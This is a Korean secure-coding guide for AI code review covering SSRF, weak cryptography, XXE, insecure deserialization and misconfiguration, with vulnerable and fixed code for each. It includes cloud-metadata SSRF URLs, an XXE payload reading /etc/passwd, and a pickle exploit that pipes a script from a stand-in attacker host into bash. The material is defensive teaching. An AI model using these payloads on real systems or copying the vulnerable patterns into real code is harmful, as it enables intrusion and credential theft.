# 🗡️ B-06: Server-Side Request Forgery (SSRF)
## AI 코드 분석 지침

| OWASP | CWE | CVSS |
|-------|-----|------|
| A10:2021 | CWE-918 | 7.5~10.0 HIGH~CRITICAL |

---

## 1️⃣ 공격 원리

```
서버가 사용자가 지정한 URL로 요청을 보낼 때,
공격자가 내부 서비스 주소를 지정하여 내부망을 탐색합니다.

AWS 메타데이터 탈취:
  url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  → EC2 인스턴스의 IAM 자격증명 획득 → AWS 계정 장악

내부 서비스 탐색:
  url = "http://internal-db.company.local:5432"
  url = "http://redis:6379"
  url = "http://kubernetes.default.svc"

파일 읽기 (file:// 스킴):
  url = "file:///etc/passwd"
  url = "file:///app/config.py"
```

---

## 2️⃣ 취약 패턴 탐지

```python
# ❌ CRITICAL: URL 검증 없는 외부 요청
import requests, httpx

@app.post("/fetch")
async def fetch_url(url: str):
    response = requests.get(url)  # url 검증 전혀 없음
    return response.text

@app.post("/webhook/test")
async def test_webhook(webhook_url: str):
    async with httpx.AsyncClient() as client:
        await client.post(webhook_url, json={"test": True})  # 내부망 접근 가능

# ❌ HIGH: 부분 검증만 있는 경우
@app.post("/image-proxy")
async def proxy(url: str):
    if "evil.com" not in url:  # 블랙리스트 방식 — 우회 가능
        return requests.get(url).content

# ❌ HIGH: 리다이렉트 따라가는 요청
response = requests.get(url, allow_redirects=True)
# 공격자가 자신의 서버에서 내부 IP로 리다이렉트 설정 가능
```

```javascript
// ❌ Node.js: URL 검증 없는 fetch
app.post('/proxy', async (req, res) => {
  const response = await fetch(req.body.url);  // SSRF
  res.send(await response.text());
});

// ❌ axios 사용 시
const data = await axios.get(req.query.endpoint);
```

```java
// ❌ Spring Boot: RestTemplate SSRF
@PostMapping("/fetch")
public String fetchUrl(@RequestParam String url) throws Exception {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);  // SSRF
}
```

---

## 3️⃣ 올바른 수정 패턴

```python
import ipaddress, re
from urllib.parse import urlparse

# 차단할 내부 네트워크 목록
BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),  # AWS 메타데이터
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
]
ALLOWED_SCHEMES = {"https"}
ALLOWED_DOMAINS = {"api.trusted-partner.com", "cdn.myapp.com"}

def validate_url(url: str) -> str:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Scheme not allowed: {parsed.scheme}")
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.hostname}")
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for net in BLOCKED_NETWORKS:
            if ip in net:
                raise ValueError(f"Internal IP blocked: {ip}")
    except ValueError:
        pass
    return url

@app.post("/fetch")
async def safe_fetch(url: str):
    safe_url = validate_url(url)
    async with httpx.AsyncClient() as client:
        r = await client.get(safe_url,
            follow_redirects=False,  # 리다이렉트 차단
            timeout=5.0)
    return r.text[:10000]  # 응답 크기 제한
```

---

## 4️⃣ 심각도 판단

```
CRITICAL: URL 검증 없음 + AWS/클라우드 환경 (메타데이터 탈취)
HIGH:     URL 검증 없음 + 일반 서버 (내부망 탐색)
MEDIUM:   블랙리스트 방식 검증 (우회 가능)
LOW:      화이트리스트 있으나 리다이렉트 미차단
```

---
---

# 🗡️ B-07: Cryptographic Failures (암호화 실패)
## AI 코드 분석 지침

| OWASP | CWE | CVSS |
|-------|-----|------|
| A02:2021 (2위) | CWE-311, CWE-327, CWE-328, CWE-916 | 5.9~9.1 |

---

## 1️⃣ 공격 원리

```
약한 해시: MD5/SHA1 → 레인보우 테이블로 즉시 역산
ECB 모드:  동일 입력 = 동일 출력 → 패턴 분석으로 복호화
평문 전송: HTTP 사용 → 네트워크 스니핑으로 탈취
하드코딩 키: 코드에서 발견 → 즉시 모든 암호화 해제
```

---

## 2️⃣ 취약 패턴 탐지

```python
# ❌ CRITICAL: 비밀번호에 MD5/SHA1 해시
import hashlib
pw_hash = hashlib.md5(password.encode()).hexdigest()
pw_hash = hashlib.sha1(password.encode()).hexdigest()
pw_hash = hashlib.sha256(password.encode()).hexdigest()  # 솔트 없으면 위험

# ❌ CRITICAL: 하드코딩된 암호화 키
SECRET_KEY = "my-secret-key-1234"
AES_KEY = b"1234567890abcdef"
ENCRYPTION_KEY = "hardcoded_key_here"

# ❌ HIGH: AES-ECB 모드 사용
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)  # ECB는 패턴 노출

# ❌ HIGH: 약한 난수 생성
import random
token = random.randint(100000, 999999)  # 예측 가능
session_id = str(random.random())

# ❌ HIGH: SSL 인증서 검증 비활성화
requests.get(url, verify=False)
ssl._create_default_https_context = ssl._create_unverified_context

# ❌ MEDIUM: 짧은 키 길이
rsa_key = RSA.generate(1024)   # RSA-1024 → 이미 취약
aes_key = os.urandom(16)       # AES-128 (양자 환경에서 약화)
```

```javascript
// ❌ Node.js: crypto.createHash('md5') for passwords
const hash = crypto.createHash('md5').update(password).digest('hex');

// ❌ 하드코딩 시크릿
const JWT_SECRET = 'super-secret-key';
const ENCRYPT_KEY = 'my-encryption-key-123';

// ❌ Math.random() 보안 목적 사용
const token = Math.random().toString(36).substr(2);
const csrfToken = Math.random().toString(16);
```

```java
// ❌ Spring: MD5 비밀번호
MessageDigest md = MessageDigest.getInstance("MD5");
String hashedPw = new String(md.digest(password.getBytes()));

// ❌ DES/3DES 사용 (deprecated)
Cipher cipher = Cipher.getInstance("DES");
Cipher cipher = Cipher.getInstance("DESede");
```

---

## 3️⃣ 올바른 수정 패턴

```python
# ✅ 비밀번호: Argon2/bcrypt
from passlib.context import CryptContext
pwd = CryptContext(schemes=["argon2"], deprecated="auto")

# ✅ 대칭 암호화: AES-256-GCM
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
key = os.urandom(32)  # 256비트
nonce = os.urandom(12)
ct = AESGCM(key).encrypt(nonce, plaintext, None)

# ✅ 안전한 난수
import secrets
token = secrets.token_urlsafe(32)
session_id = secrets.token_hex(32)

# ✅ RSA 최소 4096비트
from cryptography.hazmat.primitives.asymmetric import rsa
key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
```

---

## 4️⃣ 심각도 판단

```
CRITICAL: 하드코딩 키 / 비밀번호 평문 저장 / SSL 검증 비활성화
HIGH:     MD5/SHA1 비밀번호 해시 / ECB 모드 / 약한 난수 (보안 목적)
MEDIUM:   AES-128 사용 / RSA-2048 (전환 권고) / SHA-256 단독 (장기 보관)
LOW:      비권장 알고리즘이나 직접 공격 경로 없음
```

---
---

# 🗡️ B-08: XML External Entity (XXE)
## AI 코드 분석 지침

| OWASP | CWE | CVSS |
|-------|-----|------|
| A05:2021 (구 A04) | CWE-611 | 7.5~9.8 HIGH~CRITICAL |

---

## 1️⃣ 공격 원리

```xml
<!-- 공격자가 보내는 악성 XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

→ 서버가 /etc/passwd 파일을 XML 응답에 포함해서 반환
→ SSRF 연계: <!ENTITY xxe SYSTEM "http://169.254.169.254/...">
```

---

## 2️⃣ 취약 패턴 탐지

```python
# ❌ CRITICAL: defusedxml 미사용 + 외부 엔티티 허용
import xml.etree.ElementTree as ET
tree = ET.parse(user_xml_file)           # XXE 취약
root = ET.fromstring(user_xml_string)    # XXE 취약

import lxml.etree as etree
parser = etree.XMLParser()               # 기본값 = 외부 엔티티 허용
root = etree.parse(xml_file, parser)

# ❌ HIGH: libxml2 기반 파서 기본 설정
from lxml import etree
doc = etree.fromstring(xml_content)  # resolve_entities=True 기본값
```

```java
// ❌ CRITICAL: DocumentBuilder 기본 설정
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 외부 엔티티 비활성화 없음
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userXmlInput);

// ❌ SAXParser 기본 설정
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
```

---

## 3️⃣ 올바른 수정 패턴

```python
# ✅ defusedxml 사용 (XXE, Billion Laughs 등 방어)
import defusedxml.ElementTree as ET
root = ET.fromstring(user_xml_string)  # 외부 엔티티 자동 차단

# ✅ lxml 안전 설정
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
root = etree.fromstring(xml_content, parser)
```

```java
// ✅ Java XXE 방어
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

---

## 4️⃣ 심각도 판단

```
CRITICAL: 외부 엔티티 허용 + 파일 읽기/SSRF 가능
HIGH:     Billion Laughs (DoS) 가능 / 부분적 정보 노출
MEDIUM:   DTD 허용이나 네트워크 접근 차단된 환경
```

---
---

# 🗡️ B-09: Insecure Deserialization
## AI 코드 분석 지침

| OWASP | CWE | CVSS |
|-------|-----|------|
| A08:2021 | CWE-502 | 8.1~9.8 HIGH~CRITICAL |

---

## 1️⃣ 공격 원리

```python
# 공격자가 만든 악성 pickle 페이로드
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = pickle.dumps(Exploit())
# 서버가 이 페이로드를 pickle.loads()하는 순간 RCE 발생
```

---

## 2️⃣ 취약 패턴 탐지

```python
# ❌ CRITICAL: 사용자 입력 pickle 역직렬화
import pickle
data = pickle.loads(request.body)
data = pickle.loads(redis.get("user_session"))
data = pickle.loads(base64.b64decode(cookie_value))

# ❌ CRITICAL: yaml.load() 기본 사용 (PyYAML < 6.0)
import yaml
data = yaml.load(user_input)  # yaml.safe_load 가 아님

# ❌ HIGH: marshal 역직렬화
import marshal
data = marshal.loads(user_data)

# ❌ HIGH: shelve에 사용자 입력 직접 저장 후 로드
import shelve
db = shelve.open('data')
db[user_key] = user_value  # user_key가 경로 조작 가능
```

```java
// ❌ CRITICAL: Java 기본 역직렬화
ObjectInputStream ois = new ObjectInputStream(userInputStream);
Object obj = ois.readObject();  // 가젯 체인으로 RCE 가능

// ❌ HIGH: XStream XML 역직렬화
XStream xstream = new XStream();
Object obj = xstream.fromXML(userXml);  // 기본 설정 = 취약
```

---

## 3️⃣ 올바른 수정 패턴

```python
# ✅ JSON + Pydantic으로 구조 검증 (pickle 대신)
from pydantic import BaseModel
class SessionData(BaseModel):
    user_id: int
    role: str

data = SessionData.model_validate_json(json_string)

# ✅ yaml.safe_load 사용
import yaml
data = yaml.safe_load(user_input)  # safe_load만 사용

# ✅ Redis 세션 — JSON 직렬화
import json, redis
r = redis.Redis()
r.set("session:123", json.dumps({"user_id": 1}))
data = json.loads(r.get("session:123"))
```

---

## 4️⃣ 심각도 판단

```
CRITICAL: pickle.loads / marshal.loads / Java ObjectInputStream + 사용자 입력
HIGH:     yaml.load (unsafe) / XStream 기본 설정
MEDIUM:   내부에서만 사용되나 입력 경로 존재
```

---
---

# 🗡️ B-10: Security Misconfiguration (보안 설정 오류)
## AI 코드 분석 지침

| OWASP | CWE | CVSS |
|-------|-----|------|
| A05:2021 (2위 급상승) | CWE-16, CWE-732 | 5.0~9.8 |

---

## 1️⃣ 취약 패턴 탐지

```python
# ❌ HIGH: 프로덕션에서 DEBUG 모드
# FastAPI
app = FastAPI(debug=True)

# Flask
app.run(debug=True)
app.config['DEBUG'] = True

# Django
DEBUG = True  # settings.py (프로덕션에서)

# ❌ HIGH: Swagger/Docs 프로덕션 노출
app = FastAPI(
    docs_url="/docs",   # 프로덕션에서 비활성화 필요
    redoc_url="/redoc"
)

# ❌ HIGH: CORS 와일드카드 + Credentials
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True  # * + credentials = 치명적
)

# ❌ MEDIUM: 보안 헤더 미설정 (X-Frame-Options, CSP 등)
# 헤더 없이 응답 반환

# ❌ MEDIUM: 스택 트레이스 클라이언트 노출
@app.exception_handler(Exception)
async def handler(req, exc):
    return JSONResponse({"error": str(exc), "traceback": traceback.format_exc()})
```

```javascript
// ❌ Express: helmet 미사용
const app = express();
// helmet() 없음 → 보안 헤더 전무

// ❌ morgan 로그에 민감 정보
app.use(morgan(':method :url :body'));  // body에 비밀번호 포함 가능

// ❌ Next.js: API Route에 CORS 설정 없음
export default function handler(req, res) {
  // CORS 헤더 없음 → 기본값은 same-origin만 허용이나 명시 필요
}
```

```java
// ❌ Spring Boot: Actuator 전체 노출
# application.properties
management.endpoints.web.exposure.include=*  # 모든 엔드포인트 공개

// ❌ Spring Security 비활성화
@SpringBootApplication(exclude = {SecurityAutoConfiguration.class})

// ❌ H2 Console 프로덕션 노출
spring.h2.console.enabled=true
```

---

## 2️⃣ 올바른 수정 패턴

```python
# ✅ 환경별 설정 분리
import os
ENV = os.getenv("ENVIRONMENT", "production")

app = FastAPI(
    debug=ENV == "development",
    docs_url="/docs" if ENV == "development" else None,
    redoc_url=None if ENV == "production" else "/redoc",
)

# ✅ 보안 헤더 미들웨어
@app.middleware("http")
async def security_headers(request, call_next):
    response = await call_next(request)
    response.headers.update({
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Content-Security-Policy": "default-src 'self'",
        "X-XSS-Protection": "1; mode=block",
        "Server": "MyApp",  # 실제 서버 정보 숨김
    })
    return response

# ✅ 에러 핸들러 — 내부 정보 미노출
@app.exception_handler(Exception)
async def handler(req, exc):
    logger.error(f"Error: {exc}", exc_info=True)  # 서버 로그에만
    return JSONResponse(status_code=500,
        content={"detail": "Internal server error"})  # 클라이언트는 제네릭
```

---

## 3️⃣ 심각도 판단

```
CRITICAL: DEBUG=True + 스택 트레이스 노출 (경로·DB구조 노출)
HIGH:     CORS * + credentials / Swagger 프로덕션 노출 / Actuator 전체 공개
MEDIUM:   보안 헤더 누락 / 에러 메시지 정보 노출
LOW:      서버 버전 헤더 노출 / 불필요한 HTTP 메서드 허용
```

---

*참조: OWASP Top 10, CWE/SANS Top 25*
*탐지 도구: Bandit (Python), ESLint-security (JS), Trivy, ZAP*
